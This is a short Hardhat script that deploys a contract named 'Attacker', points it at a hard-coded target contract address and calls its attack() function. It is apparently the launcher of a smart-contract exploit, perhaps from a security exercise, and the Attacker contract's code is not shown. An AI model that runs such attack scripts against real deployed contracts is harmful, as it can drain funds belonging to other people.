import { ethers } from "hardhat";

async function main() {
  const [deployer] = await ethers.getSigners();

  console.log("Deploying contracts with the account:", deployer.address);

  console.log("Account balance:", (await deployer.getBalance()).toString());

  // We get the contract to deploy
  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy();

  console.log("attacker deployed to:", attacker.address);
  await attacker.setTarget("0xB4B06958Ab5A9d4F12be1b57e835fD1c75573F5E")
  await attacker.attack({ gasLimit: 10000000 })
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });